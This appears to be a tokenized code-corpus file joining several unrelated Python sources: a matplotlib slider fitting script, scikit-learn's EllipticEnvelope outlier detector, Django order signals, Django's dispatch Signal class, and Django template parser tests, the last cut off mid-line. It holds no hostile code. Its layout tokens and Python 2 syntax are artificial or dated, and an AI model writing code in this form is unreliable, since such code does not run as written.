0.5 , dy ] , axisbg = 'slategray' ) <newline> slidername = 'x[%i]' % i <newline> sliders [ i ] = Slider ( sliders_ax [ i ] , slidername , - 5.00 , 5.00 , valinit = x [ i ] ) <newline> <dedent> chi2 = sum ( dist2 ( x ) ** 2 ) <newline> def update ( val ) : <newline> <indent> global x <newline> ax . collections = [ ] <newline> for i in range ( len ( x ) ) : <newline> <indent> x [ i ] = sliders [ i ] . val <newline> <dedent> chi2 = sum ( dist2 ( x ) ** 2 ) <newline> g = dist ( x ) <newline> for i in range ( len ( ff ) ) : <newline> <indent> plots [ i ] . set_data ( r_mc , g [ i * len ( r ) : ( i + 1 ) * len ( r ) ] ) <newline>  # ax.plot(r_mc, ▁ g[i*len(r):(i+1)*len(r)], ▁ colors[i]+'--',label='g ▁ at ▁ filling ▁ fraction ▁ %.2f'%ff[i]) <encdom> <dedent> ax . set_title ( '$g_{HS}(r)$, ▁ $\\chi^2 ▁ %.2f$' % chi2 ) <newline> draw ( ) <newline> <dedent> for i in range ( len ( x ) ) : <newline> <indent> sliders [ i ] . on_changed ( update ) <newline> <dedent> figure ( 1 ) <newline> ax . set_xlim ( 2 , 6.5 ) <newline> ax . set_ylim ( 0. , 3.5 ) <newline> ax . set_title ( '$g_{HS}(r)$, ▁ $\\chi^2 ▁ %.2f$' % chi2 ) <newline> ax . set_xlabel ( r"$r/R$" ) <newline> ax . set_ylabel ( "$g(r)$" ) <newline> ax . axhline ( y = 0 ) <newline> ax . legend ( loc = 'best' ) <newline> show ( ) <newline>
 """ <strnewline> Class ▁ for ▁ outlier ▁ detection. <strnewline> <strnewline> This ▁ class ▁ provides ▁ a ▁ framework ▁ for ▁ outlier ▁ detection. ▁ It ▁ consists ▁ in <strnewline> several ▁ methods ▁ that ▁ can ▁ be ▁ added ▁ to ▁ a ▁ covariance ▁ estimator ▁ in ▁ order ▁ to <strnewline> assess ▁ the ▁ outlying-ness ▁ of ▁ the ▁ observations ▁ of ▁ a ▁ data ▁ set. <strnewline> Such ▁ a ▁"outlier ▁ detector" ▁ object ▁ is ▁ proposed ▁ constructed ▁ from ▁ a ▁ robust <strnewline> covariance ▁ estimator ▁ (the ▁ Minimum ▁ Covariance ▁ Determinant). <strnewline> <strnewline> """  <newline>  # ▁ Author: ▁ Virgile ▁ Fritsch ▁ <virgile.fritsch@inria.fr> <encdom>  # ▁ License: ▁ BSD ▁ 3 ▁ clause <encdom> import warnings <newline> import numpy as np <newline> import scipy as sp <newline> from . import MinCovDet <newline> from . . base import ClassifierMixin <newline> from . . utils . validation import check_is_fitted <newline> class OutlierDetectionMixin ( object ) : <newline> <indent>  """ Set ▁ of ▁ methods ▁ for ▁ outliers ▁ detection ▁ with ▁ covariance ▁ estimators. <strnewline> <strnewline> ▁ Parameters <strnewline> ▁ ----- <strnewline> ▁ contamination ▁ : ▁ float, ▁ 0. ▁ < ▁ contamination ▁ < ▁ 0.5 <strnewline> ▁ The ▁ amount ▁ of ▁ contamination ▁ of ▁ the ▁ data ▁ set, ▁ i.e. ▁ the ▁ proportion <strnewline> ▁ of ▁ outliers ▁ in ▁ the ▁ data ▁ set. <strnewline> <strnewline> ▁ Notes <strnewline> ▁ ----- <strnewline> ▁ Outlier ▁ detection ▁ from ▁ covariance ▁ estimation ▁ may ▁ break ▁ or ▁ not <strnewline> ▁ perform ▁ well ▁ in ▁ high-dimensional ▁ settings. ▁ In ▁ particular, ▁ one ▁ will <strnewline> ▁ always ▁ take ▁ care ▁ to ▁ work ▁ with ▁ ``n_samples ▁ > ▁ n_features ▁ ** ▁ 2``. <strnewline> <strnewline> ▁ """  <newline> def __init__ ( self , contamination = 0.1 ) : <newline> <indent> self . contamination = contamination <newline> <dedent> def decision_function ( self , X , raw_values = False ) : <newline> <indent>  """ Compute ▁ the ▁ decision ▁ function ▁ of ▁ the ▁ given ▁ observations. <strnewline> <strnewline> ▁ Parameters <strnewline> ▁ ----- <strnewline> ▁ X ▁ : ▁ array-like, ▁ shape ▁ (n_samples, ▁ n_features) <strnewline> <strnewline> ▁ raw_values ▁ : ▁ bool <strnewline> ▁ Whether ▁ or ▁ not ▁ to ▁ consider ▁ raw ▁ Mahalanobis ▁ distances ▁ as ▁ the <strnewline> ▁ decision ▁ function. ▁ Must ▁ be ▁ False ▁ (default) ▁ for ▁ compatibility <strnewline> ▁ with ▁ the ▁ others ▁ outlier ▁ detection ▁ tools. <strnewline> <strnewline> ▁ Returns <strnewline> ▁ ----- <strnewline> ▁ decision ▁ : ▁ array-like, ▁ shape ▁ (n_samples, ▁ ) <strnewline> ▁ The ▁ values ▁ of ▁ the ▁ decision ▁ function ▁ for ▁ each ▁ observations. <strnewline> ▁ It ▁ is ▁ equal ▁ to ▁ the ▁ Mahalanobis ▁ distances ▁ if ▁ `raw_values` <strnewline> ▁ is ▁ True. ▁ By ▁ default ▁ (``raw_values=True``), ▁ it ▁ is ▁ equal <strnewline> ▁ to ▁ the ▁ cubic ▁ root ▁ of ▁ the ▁ shifted ▁ Mahalanobis ▁ distances. <strnewline> ▁ In ▁ that ▁ case, ▁ the ▁ threshold ▁ for ▁ being ▁ an ▁ outlier ▁ is ▁ 0, ▁ which <strnewline> ▁ ensures ▁ a ▁ compatibility ▁ with ▁ other ▁ outlier ▁ detection ▁ tools <strnewline> ▁ such ▁ as ▁ the ▁ One-Class ▁ SVM. <strnewline> <strnewline> ▁ """  <newline> check_is_fitted ( self , 'threshold_' ) <newline> mahal_dist = self . mahalanobis ( X ) <newline> if raw_values : <newline> <indent> decision = mahal_dist <newline> <dedent> else : <newline> <indent> check_is_fitted ( self , 'threshold_' ) <newline> transformed_mahal_dist = mahal_dist ** 0.33 <newline> decision = self . threshold_ ** 0.33 - transformed_mahal_dist <newline> <dedent> return decision <newline> <dedent> def predict ( self , X ) : <newline> <indent>  """ Outlyingness ▁ of ▁ observations ▁ in ▁ X ▁ according ▁ to ▁ the ▁ fitted ▁ model. <strnewline> <strnewline> ▁ Parameters <strnewline> ▁ ----- <strnewline> ▁ X ▁ : ▁ array-like, ▁ shape ▁ = ▁ (n_samples, ▁ n_features) <strnewline> <strnewline> ▁ Returns <strnewline> ▁ ----- <strnewline> ▁ is_outliers ▁ : ▁ array, ▁ shape ▁ = ▁ (n_samples, ▁ ), ▁ dtype ▁ = ▁ bool <strnewline> ▁ For ▁ each ▁ observations, ▁ tells ▁ whether ▁ or ▁ not ▁ it ▁ should ▁ be ▁ considered <strnewline> ▁ as ▁ an ▁ outlier ▁ according ▁ to ▁ the ▁ fitted ▁ model. <strnewline> <strnewline> ▁ threshold ▁ : ▁ float, <strnewline> ▁ The ▁ values ▁ of ▁ the ▁ less ▁ outlying ▁ point's ▁ decision ▁ function. <strnewline> <strnewline> ▁ """  <newline> check_is_fitted ( self , 'threshold_' ) <newline> is_inlier = - np . ones ( X . shape [ 0 ] , dtype = int ) <newline> if self . contamination is not None : <newline> <indent> values = self . decision_function ( X , raw_values = True ) <newline> is_inlier [ values <= self . threshold_ ] = 1 <newline> <dedent> else : <newline> <indent> raise NotImplementedError ( "You ▁ must ▁ provide ▁ a ▁ contamination ▁ rate." ) <newline> <dedent> return is_inlier <newline> <dedent> @ property <newline> def threshold ( self ) : <newline> <indent> warnings . warn ( ( "The ▁ threshold ▁ attribute ▁ is ▁ renamed ▁ to ▁ threshold_ ▁ from ▁ " "0.16 ▁ onwards ▁ and ▁ will ▁ be ▁ removed ▁ in ▁ 0.18" ) , DeprecationWarning , stacklevel = 1 ) <newline> return getattr ( self , 'threshold_' , None ) <newline> <dedent> <dedent> class EllipticEnvelope ( ClassifierMixin , OutlierDetectionMixin , MinCovDet ) : <newline> <indent>  """ An ▁ object ▁ for ▁ detecting ▁ outliers ▁ in ▁ a ▁ Gaussian ▁ distributed ▁ dataset. <strnewline> <strnewline> ▁ Read ▁ more ▁ in ▁ the ▁ :ref:`User ▁ Guide ▁ <outlier_detection>`. <strnewline> <strnewline> ▁ Attributes <strnewline> ▁ ----- <strnewline> ▁ `contamination` ▁ : ▁ float, ▁ 0. ▁ < ▁ contamination ▁ < ▁ 0.5 <strnewline> ▁ The ▁ amount ▁ of ▁ contamination ▁ of ▁ the ▁ data ▁ set, ▁ i.e. ▁ the ▁ proportion ▁ of ▁ \ <strnewline> ▁ outliers ▁ in ▁ the ▁ data ▁ set. <strnewline> <strnewline> ▁ location_ ▁ : ▁ array-like, ▁ shape ▁ (n_features,) <strnewline> ▁ Estimated ▁ robust ▁ location <strnewline> <strnewline> ▁ covariance_ ▁ : ▁ array-like, ▁ shape ▁ (n_features, ▁ n_features) <strnewline> ▁ Estimated ▁ robust ▁ covariance ▁ matrix <strnewline> <strnewline> ▁ precision_ ▁ : ▁ array-like, ▁ shape ▁ (n_features, ▁ n_features) <strnewline> ▁ Estimated ▁ pseudo ▁ inverse ▁ matrix. <strnewline> ▁ (stored ▁ only ▁ if ▁ store_precision ▁ is ▁ True) <strnewline> <strnewline> ▁ support_ ▁ : ▁ array-like, ▁ shape ▁ (n_samples,) <strnewline> ▁ A ▁ mask ▁ of ▁ the ▁ observations ▁ that ▁ have ▁ been ▁ used ▁ to ▁ compute ▁ the <strnewline> ▁ robust ▁ estimates ▁ of ▁ location ▁ and ▁ shape. <strnewline> <strnewline> ▁ Parameters <strnewline> ▁ ----- <strnewline> ▁ store_precision ▁ : ▁ bool <strnewline> ▁ Specify ▁ if ▁ the ▁ estimated ▁ precision ▁ is ▁ stored. <strnewline> <strnewline> ▁ assume_centered ▁ : ▁ Boolean <strnewline> ▁ If ▁ True, ▁ the ▁ support ▁ of ▁ robust ▁ location ▁ and ▁ covariance ▁ estimates <strnewline> ▁ is ▁ computed, ▁ and ▁ a ▁ covariance ▁ estimate ▁ is ▁ recomputed ▁ from ▁ it, <strnewline> ▁ without ▁ centering ▁ the ▁ data. <strnewline> ▁ Useful ▁ to ▁ work ▁ with ▁ data ▁ whose ▁ mean ▁ is ▁ significantly ▁ equal ▁ to <strnewline> ▁ zero ▁ but ▁ is ▁ not ▁ exactly ▁ zero. <strnewline> ▁ If ▁ False, ▁ the ▁ robust ▁ location ▁ and ▁ covariance ▁ are ▁ directly ▁ computed <strnewline> ▁ with ▁ the ▁ FastMCD ▁ algorithm ▁ without ▁ additional ▁ treatment. <strnewline> <strnewline> ▁ support_fraction ▁ : ▁ float, ▁ 0 ▁ < ▁ support_fraction ▁ < ▁ 1 <strnewline> ▁ The ▁ proportion ▁ of ▁ points ▁ to ▁ be ▁ included ▁ in ▁ the ▁ support ▁ of ▁ the ▁ raw <strnewline> ▁ MCD ▁ estimate. ▁ Default ▁ is ▁ ``None``, ▁ which ▁ implies ▁ that ▁ the ▁ minimum <strnewline> ▁ value ▁ of ▁ support_fraction ▁ will ▁ be ▁ used ▁ within ▁ the ▁ algorithm: <strnewline> ▁ `[n_sample ▁ + ▁ n_features ▁ + ▁ 1] ▁ / ▁ 2`. <strnewline> <strnewline> ▁ contamination ▁ : ▁ float, ▁ 0. ▁ < ▁ contamination ▁ < ▁ 0.5 <strnewline> ▁ The ▁ amount ▁ of ▁ contamination ▁ of ▁ the ▁ data ▁ set, ▁ i.e. ▁ the ▁ proportion <strnewline> ▁ of ▁ outliers ▁ in ▁ the ▁ data ▁ set. <strnewline> <strnewline> ▁ See ▁ Also <strnewline> ▁ ----- <strnewline> ▁ EmpiricalCovariance, ▁ MinCovDet <strnewline> <strnewline> ▁ Notes <strnewline> ▁ ----- <strnewline> ▁ Outlier ▁ detection ▁ from ▁ covariance ▁ estimation ▁ may ▁ break ▁ or ▁ not <strnewline> ▁ perform ▁ well ▁ in ▁ high-dimensional ▁ settings. ▁ In ▁ particular, ▁ one ▁ will <strnewline> ▁ always ▁ take ▁ care ▁ to ▁ work ▁ with ▁ ``n_samples ▁ > ▁ n_features ▁ ** ▁ 2``. <strnewline> <strnewline> ▁ References <strnewline> ▁ ----- <strnewline> ▁ .. ▁ [1] ▁ Rousseeuw, ▁ P.J., ▁ Van ▁ Driessen, ▁ K. ▁"A ▁ fast ▁ algorithm ▁ for ▁ the ▁ minimum <strnewline> ▁ covariance ▁ determinant ▁ estimator" ▁ Technometrics ▁ 41(3), ▁ 212 ▁ (1999) <strnewline> <strnewline> ▁ """  <newline> def __init__ ( self , store_precision = True , assume_centered = False , support_fraction = None , contamination = 0.1 , random_state = None ) : <newline> <indent> MinCovDet . __init__ ( self , store_precision = store_precision , assume_centered = assume_centered , support_fraction = support_fraction , random_state = random_state ) <newline> OutlierDetectionMixin . __init__ ( self , contamination = contamination ) <newline> <dedent> def fit ( self , X , y = None ) : <newline> <indent> MinCovDet . fit ( self , X ) <newline> self . threshold_ = sp . stats . scoreatpercentile ( self . dist_ , 100. * ( 1. - self . contamination ) ) <newline> return self <newline> <dedent> <dedent>
import django . dispatch <newline>  # ▁ Order-related ▁ signals <encdom>  """ Emitted ▁ when ▁ the ▁ Cart ▁ was ▁ converted ▁ to ▁ an ▁ Order """  <newline> processing = django . dispatch . Signal ( providing_args = [ 'order' , 'cart' ] ) <newline>  """ Emitted ▁ when ▁ the ▁ user ▁ is ▁ shown ▁ the ▁"select ▁ a ▁ payment ▁ method" ▁ page ▁ """  <newline> payment_selection = django . dispatch . Signal ( providing_args = [ 'order' ] ) <newline>  """ Emitted ▁ when ▁ the ▁ user ▁ finished ▁ placing ▁ his ▁ order ▁ (regardless ▁ of ▁ the ▁ payment <strnewline> success ▁ or ▁ failure) """  <newline> confirmed = django . dispatch . Signal ( providing_args = [ 'order' ] ) <newline>  """ Emitted ▁ when ▁ the ▁ payment ▁ was ▁ received ▁ for ▁ the ▁ Order """  <newline> completed = django . dispatch . Signal ( providing_args = [ 'order' ] ) <newline>  """ Emitted ▁ if ▁ the ▁ payment ▁ was ▁ refused ▁ or ▁ other ▁ fatal ▁ problem """  <newline> cancelled = django . dispatch . Signal ( providing_args = [ 'order' ] ) <newline>  """ Emitted ▁ (manually) ▁ when ▁ the ▁ shop ▁ clerk ▁ or ▁ robot ▁ shipped ▁ the ▁ order """  <newline> shipped = django . dispatch . Signal ( providing_args = [ 'order' ] ) <newline>
import weakref <newline> import threading <newline> from django . dispatch import saferef <newline> WEAKREF_TYPES = ( weakref . ReferenceType , saferef . BoundMethodWeakref ) <newline> def _make_id ( target ) : <newline> <indent> if hasattr ( target , 'im_func' ) : <newline> <indent> return ( id ( target . im_self ) , id ( target . im_func ) ) <newline> <dedent> return id ( target ) <newline> <dedent> class Signal ( object ) : <newline> <indent>  """ <strnewline> ▁ Base ▁ class ▁ for ▁ all ▁ signals <strnewline> ▁ <strnewline> ▁ Internal ▁ attributes: <strnewline> ▁ <strnewline> ▁ receivers <strnewline> ▁ { ▁ receriverkey ▁ (id) ▁ : ▁ weakref(receiver) ▁ } <strnewline> ▁ """  <newline> def __init__ ( self , providing_args = None ) : <newline> <indent>  """ <strnewline> ▁ Create ▁ a ▁ new ▁ signal. <strnewline> ▁ <strnewline> ▁ providing_args <strnewline> ▁ A ▁ list ▁ of ▁ the ▁ arguments ▁ this ▁ signal ▁ can ▁ pass ▁ along ▁ in ▁ a ▁ send() ▁ call. <strnewline> ▁ """  <newline> self . receivers = [ ] <newline> if providing_args is None : <newline> <indent> providing_args = [ ] <newline> <dedent> self . providing_args = set ( providing_args ) <newline> self . lock = threading . Lock ( ) <newline> <dedent> def connect ( self , receiver , sender = None , weak = True , dispatch_uid = None ) : <newline> <indent>  """ <strnewline> ▁ Connect ▁ receiver ▁ to ▁ sender ▁ for ▁ signal. <strnewline> ▁ <strnewline> ▁ Arguments: <strnewline> ▁ <strnewline> ▁ receiver <strnewline> ▁ A ▁ function ▁ or ▁ an ▁ instance ▁ method ▁ which ▁ is ▁ to ▁ receive ▁ signals. <strnewline> ▁ Receivers ▁ must ▁ be ▁ hashable ▁ objects. <strnewline> <strnewline> ▁ If ▁ weak ▁ is ▁ True, ▁ then ▁ receiver ▁ must ▁ be ▁ weak-referencable ▁ (more <strnewline> ▁ precisely ▁ saferef.safeRef() ▁ must ▁ be ▁ able ▁ to ▁ create ▁ a ▁ reference <strnewline> ▁ to ▁ the ▁ receiver). <strnewline> ▁ <strnewline> ▁ Receivers ▁ must ▁ be ▁ able ▁ to ▁ accept ▁ keyword ▁ arguments. <strnewline> <strnewline> ▁ If ▁ receivers ▁ have ▁ a ▁ dispatch_uid ▁ attribute, ▁ the ▁ receiver ▁ will <strnewline> ▁ not ▁ be ▁ added ▁ if ▁ another ▁ receiver ▁ already ▁ exists ▁ with ▁ that <strnewline> ▁ dispatch_uid. <strnewline> <strnewline> ▁ sender <strnewline> ▁ The ▁ sender ▁ to ▁ which ▁ the ▁ receiver ▁ should ▁ respond. ▁ Must ▁ either ▁ be <strnewline> ▁ of ▁ type ▁ Signal, ▁ or ▁ None ▁ to ▁ receive ▁ events ▁ from ▁ any ▁ sender. <strnewline> <strnewline> ▁ weak <strnewline> ▁ Whether ▁ to ▁ use ▁ weak ▁ references ▁ to ▁ the ▁ receiver. ▁ By ▁ default, ▁ the <strnewline> ▁ module ▁ will ▁ attempt ▁ to ▁ use ▁ weak ▁ references ▁ to ▁ the ▁ receiver <strnewline> ▁ objects. ▁ If ▁ this ▁ parameter ▁ is ▁ false, ▁ then ▁ strong ▁ references ▁ will <strnewline> ▁ be ▁ used. <strnewline> ▁ <strnewline> ▁ dispatch_uid <strnewline> ▁ An ▁ identifier ▁ used ▁ to ▁ uniquely ▁ identify ▁ a ▁ particular ▁ instance ▁ of <strnewline> ▁ a ▁ receiver. ▁ This ▁ will ▁ usually ▁ be ▁ a ▁ string, ▁ though ▁ it ▁ may ▁ be <strnewline> ▁ anything ▁ hashable. <strnewline> ▁ """  <newline> from django . conf import settings <newline>  # ▁ If ▁ DEBUG ▁ is ▁ on, ▁ check ▁ that ▁ we ▁ got ▁ a ▁ good ▁ receiver <encdom> if settings . DEBUG : <newline> <indent> import inspect <newline> assert callable ( receiver ) , "Signal ▁ receivers ▁ must ▁ be ▁ callable." <newline>  # ▁ Check ▁ for ▁ **kwargs <encdom>  # ▁ Not ▁ all ▁ callables ▁ are ▁ inspectable ▁ with ▁ getargspec, ▁ so ▁ we'll <encdom>  # ▁ try ▁ a ▁ couple ▁ different ▁ ways ▁ but ▁ in ▁ the ▁ end ▁ fall ▁ back ▁ on ▁ assuming <encdom>  # ▁ it ▁ is ▁ -- ▁ we ▁ don't ▁ want ▁ to ▁ prevent ▁ registration ▁ of ▁ valid ▁ but ▁ weird <encdom>  # ▁ callables. <encdom> try : <newline> <indent> argspec = inspect . getargspec ( receiver ) <newline> <dedent> except TypeError : <newline> <indent> try : <newline> <indent> argspec = inspect . getargspec ( receiver . __call__ ) <newline> <dedent> except ( TypeError , AttributeError ) : <newline> <indent> argspec = None <newline> <dedent> <dedent> if argspec : <newline> <indent> assert argspec [ 2 ] is not None , "Signal ▁ receivers ▁ must ▁ accept ▁ keyword ▁ arguments ▁ (**kwargs)." <newline> <dedent> <dedent> if dispatch_uid : <newline> <indent> lookup_key = ( dispatch_uid , _make_id ( sender ) ) <newline> <dedent> else : <newline> <indent> lookup_key = ( _make_id ( receiver ) , _make_id ( sender ) ) <newline> <dedent> if weak : <newline> <indent> receiver = saferef . safeRef ( receiver , onDelete = self . _remove_receiver ) <newline> <dedent> self . lock . acquire ( ) <newline> try : <newline> <indent> for r_key , _ in self . receivers : <newline> <indent> if r_key == lookup_key : <newline> <indent> break <newline> <dedent> <dedent> else : <newline> <indent> self . receivers . append ( ( lookup_key , receiver ) ) <newline> <dedent> <dedent> finally : <newline> <indent> self . lock . release ( ) <newline> <dedent> <dedent> def disconnect ( self , receiver = None , sender = None , weak = True , dispatch_uid = None ) : <newline> <indent>  """ <strnewline> ▁ Disconnect ▁ receiver ▁ from ▁ sender ▁ for ▁ signal. <strnewline> <strnewline> ▁ If ▁ weak ▁ references ▁ are ▁ used, ▁ disconnect ▁ need ▁ not ▁ be ▁ called. ▁ The ▁ receiver <strnewline> ▁ will ▁ be ▁ remove ▁ from ▁ dispatch ▁ automatically. <strnewline> ▁ <strnewline> ▁ Arguments: <strnewline> ▁ <strnewline> ▁ receiver <strnewline> ▁ The ▁ registered ▁ receiver ▁ to ▁ disconnect. ▁ May ▁ be ▁ none ▁ if <strnewline> ▁ dispatch_uid ▁ is ▁ specified. <strnewline> ▁ <strnewline> ▁ sender <strnewline> ▁ The ▁ registered ▁ sender ▁ to ▁ disconnect <strnewline> ▁ <strnewline> ▁ weak <strnewline> ▁ The ▁ weakref ▁ state ▁ to ▁ disconnect <strnewline> ▁ <strnewline> ▁ dispatch_uid <strnewline> ▁ the ▁ unique ▁ identifier ▁ of ▁ the ▁ receiver ▁ to ▁ disconnect <strnewline> ▁ """  <newline> if dispatch_uid : <newline> <indent> lookup_key = ( dispatch_uid , _make_id ( sender ) ) <newline> <dedent> else : <newline> <indent> lookup_key = ( _make_id ( receiver ) , _make_id ( sender ) ) <newline> <dedent> self . lock . acquire ( ) <newline> try : <newline> <indent> for index in xrange ( len ( self . receivers ) ) : <newline> <indent> ( r_key , _ ) = self . receivers [ index ] <newline> if r_key == lookup_key : <newline> <indent> del self . receivers [ index ] <newline> break <newline> <dedent> <dedent> <dedent> finally : <newline> <indent> self . lock . release ( ) <newline> <dedent> <dedent> def send ( self , sender , ** named ) : <newline> <indent>  """ <strnewline> ▁ Send ▁ signal ▁ from ▁ sender ▁ to ▁ all ▁ connected ▁ receivers. <strnewline> <strnewline> ▁ If ▁ any ▁ receiver ▁ raises ▁ an ▁ error, ▁ the ▁ error ▁ propagates ▁ back ▁ through ▁ send, <strnewline> ▁ terminating ▁ the ▁ dispatch ▁ loop, ▁ so ▁ it ▁ is ▁ quite ▁ possible ▁ to ▁ not ▁ have ▁ all <strnewline> ▁ receivers ▁ called ▁ if ▁ a ▁ raises ▁ an ▁ error. <strnewline> <strnewline> ▁ Arguments: <strnewline> ▁ <strnewline> ▁ sender <strnewline> ▁ The ▁ sender ▁ of ▁ the ▁ signal ▁ Either ▁ a ▁ specific ▁ object ▁ or ▁ None. <strnewline> ▁ <strnewline> ▁ named <strnewline> ▁ Named ▁ arguments ▁ which ▁ will ▁ be ▁ passed ▁ to ▁ receivers. <strnewline> <strnewline> ▁ Returns ▁ a ▁ list ▁ of ▁ tuple ▁ pairs ▁ [(receiver, ▁ response), ▁ ... ▁ ]. <strnewline> ▁ """  <newline> responses = [ ] <newline> if not self . receivers : <newline> <indent> return responses <newline> <dedent> for receiver in self . _live_receivers ( _make_id ( sender ) ) : <newline> <indent> response = receiver ( signal = self , sender = sender , ** named ) <newline> responses . append ( ( receiver , response ) ) <newline> <dedent> return responses <newline> <dedent> def send_robust ( self , sender , ** named ) : <newline> <indent>  """ <strnewline> ▁ Send ▁ signal ▁ from ▁ sender ▁ to ▁ all ▁ connected ▁ receivers ▁ catching ▁ errors. <strnewline> <strnewline> ▁ Arguments: <strnewline> ▁ <strnewline> ▁ sender <strnewline> ▁ The ▁ sender ▁ of ▁ the ▁ signal. ▁ Can ▁ be ▁ any ▁ python ▁ object ▁ (normally ▁ one <strnewline> ▁ registered ▁ with ▁ a ▁ connect ▁ if ▁ you ▁ actually ▁ want ▁ something ▁ to <strnewline> ▁ occur). <strnewline> <strnewline> ▁ named <strnewline> ▁ Named ▁ arguments ▁ which ▁ will ▁ be ▁ passed ▁ to ▁ receivers. ▁ These <strnewline> ▁ arguments ▁ must ▁ be ▁ a ▁ subset ▁ of ▁ the ▁ argument ▁ names ▁ defined ▁ in <strnewline> ▁ providing_args. <strnewline> <strnewline> ▁ Return ▁ a ▁ list ▁ of ▁ tuple ▁ pairs ▁ [(receiver, ▁ response), ▁ ... ▁ ]. ▁ May ▁ raise <strnewline> ▁ DispatcherKeyError. <strnewline> <strnewline> ▁ If ▁ any ▁ receiver ▁ raises ▁ an ▁ error ▁ (specifically ▁ any ▁ subclass ▁ of <strnewline> ▁ Exception), ▁ the ▁ error ▁ instance ▁ is ▁ returned ▁ as ▁ the ▁ result ▁ for ▁ that <strnewline> ▁ receiver. <strnewline> ▁ """  <newline> responses = [ ] <newline> if not self . receivers : <newline> <indent> return responses <newline>  # ▁ Call ▁ each ▁ receiver ▁ with ▁ whatever ▁ arguments ▁ it ▁ can ▁ accept. <encdom>  # ▁ Return ▁ a ▁ list ▁ of ▁ tuple ▁ pairs ▁ [(receiver, ▁ response), ▁ ... ▁ ]. <encdom> <dedent> for receiver in self . _live_receivers ( _make_id ( sender ) ) : <newline> <indent> try : <newline> <indent> response = receiver ( signal = self , sender = sender , ** named ) <newline> <dedent> except Exception , err : <newline> <indent> responses . append ( ( receiver , err ) ) <newline> <dedent> else : <newline> <indent> responses . append ( ( receiver , response ) ) <newline> <dedent> <dedent> return responses <newline> <dedent> def _live_receivers ( self , senderkey ) : <newline> <indent>  """ <strnewline> ▁ Filter ▁ sequence ▁ of ▁ receivers ▁ to ▁ get ▁ resolved, ▁ live ▁ receivers. <strnewline> <strnewline> ▁ This ▁ checks ▁ for ▁ weak ▁ references ▁ and ▁ resolves ▁ them, ▁ then ▁ returning ▁ only <strnewline> ▁ live ▁ receivers. <strnewline> ▁ """  <newline> none_senderkey = _make_id ( None ) <newline> receivers = [ ] <newline> for ( receiverkey , r_senderkey ) , receiver in self . receivers : <newline> <indent> if r_senderkey == none_senderkey or r_senderkey == senderkey : <newline> <indent> if isinstance ( receiver , WEAKREF_TYPES ) : <newline>  # ▁ Dereference ▁ the ▁ weak ▁ reference. <encdom> <indent> receiver = receiver ( ) <newline> if receiver is not None : <newline> <indent> receivers . append ( receiver ) <newline> <dedent> <dedent> else : <newline> <indent> receivers . append ( receiver ) <newline> <dedent> <dedent> <dedent> return receivers <newline> <dedent> def _remove_receiver ( self , receiver ) : <newline> <indent>  """ <strnewline> ▁ Remove ▁ dead ▁ receivers ▁ from ▁ connections. <strnewline> ▁ """  <newline> self . lock . acquire ( ) <newline> try : <newline> <indent> to_remove = [ ] <newline> for key , connected_receiver in self . receivers : <newline> <indent> if connected_receiver == receiver : <newline> <indent> to_remove . append ( key ) <newline> <dedent> <dedent> for key in to_remove : <newline> <indent> last_idx = len ( self . receivers ) - 1 <newline>  # ▁ enumerate ▁ in ▁ reverse ▁ order ▁ so ▁ that ▁ indexes ▁ are ▁ valid ▁ even <encdom>  # ▁ after ▁ we ▁ delete ▁ some ▁ items <encdom> for idx , ( r_key , _ ) in enumerate ( reversed ( self . receivers ) ) : <newline> <indent> if r_key == key : <newline> <indent> del self . receivers [ last_idx - idx ] <newline> <dedent> <dedent> <dedent> <dedent> finally : <newline> <indent> self . lock . release ( ) <newline> <dedent> <dedent> <dedent> def receiver ( signal , ** kwargs ) : <newline> <indent>  """ <strnewline> ▁ A ▁ decorator ▁ for ▁ connecting ▁ receivers ▁ to ▁ signals. ▁ Used ▁ by ▁ passing ▁ in ▁ the <strnewline> ▁ signal ▁ and ▁ keyword ▁ arguments ▁ to ▁ connect:: <strnewline> <strnewline> ▁ @receiver(post_save, ▁ sender=MyModel) <strnewline> ▁ def ▁ signal_receiver(sender, ▁ **kwargs): <strnewline> ▁ ... <strnewline> <strnewline> ▁ """  <newline> def _decorator ( func ) : <newline> <indent> signal . connect ( func , ** kwargs ) <newline> return func <newline> <dedent> return _decorator <newline> <dedent>
 """ <strnewline> Testing ▁ some ▁ internals ▁ of ▁ the ▁ template ▁ processing. ▁ These ▁ are ▁ *not* ▁ examples ▁ to ▁ be ▁ copied ▁ in ▁ user ▁ code. <strnewline> """  <newline> from __future__ import unicode_literals <newline> from unittest import TestCase <newline> from django . template import ( TokenParser , FilterExpression , Parser , Variable , Template , TemplateSyntaxError , Library ) <newline> from django . test import override_settings <newline> from django . utils import six <newline> class ParserTests ( TestCase ) : <newline> <indent> def test_token_parsing ( self ) : <newline>  # ▁ Tests ▁ for ▁ TokenParser ▁ behavior ▁ in ▁ the ▁ face ▁ of ▁ quoted ▁ strings ▁ with <encdom>  # ▁ spaces. <encdom> <indent> p = TokenParser ( "tag ▁ thevar|filter ▁ sometag" ) <newline> self . assertEqual ( p . tagname , "tag" ) <newline> self . assertEqual ( p . value ( ) , "thevar|filter" ) <newline> self . assertTrue ( p . more ( ) ) <newline> self . assertEqual ( p . tag ( ) , "sometag" ) <newline> self . assertFalse ( p . more ( ) ) <newline> p = TokenParser ( 'tag ▁"a ▁ value"|filter ▁ sometag' ) <newline> self . assertEqual ( p . tagname , "tag" ) <newline> self . assertEqual ( p . value ( ) , '"a ▁ value"|filter' ) <newline> self . assertTrue ( p . more ( ) ) <newline> self . assertEqual ( p . tag ( ) , "sometag" ) <newline> self . assertFalse ( p . more ( ) ) <newline> p = TokenParser ( "tag ▁'a ▁ value'|filter ▁ sometag" ) <newline> self . assertEqual ( p . tagname , "tag" ) <newline> self . assertEqual ( p . value ( ) , "'a ▁ value'|filter" ) <newline> self . assertTrue ( p . more ( ) ) <newline> self . assertEqual ( p . tag ( ) , "sometag" ) <newline> self . assertFalse ( p . more ( ) ) <newline> <dedent> def test_filter_parsing ( self ) : <newline> <indent> c = { "article" : { "section" : "News" } } <newline> p = Parser ( "" ) <newline> def fe_test ( s , val ) : <newline> <indent> self . assertEqual ( FilterExpression ( s , p ) . resolve ( c ) , val ) <newline> <dedent> fe_test ( "article.section" , "News" ) <newline> fe_test ( "article.section|upper" , "NEWS" ) <newline> fe_test ( '"News"' , "News" ) <newline> fe_test ( "'News'" , "News" ) <newline> fe_test ( r'"Some ▁ \"Good\" ▁ News"' , 'Some ▁"Good" ▁ News' ) <newline> fe_test ( r'"Some ▁ \"Good\" ▁ News"' , 'Some ▁"Good" ▁ News' ) <newline> fe_test ( r"'Some ▁ \'Bad\' ▁ News'" , "Some ▁'Bad' ▁ News" ) <newline> fe = FilterExpression ( r'"Some ▁ \"Good\" ▁ News"' , p 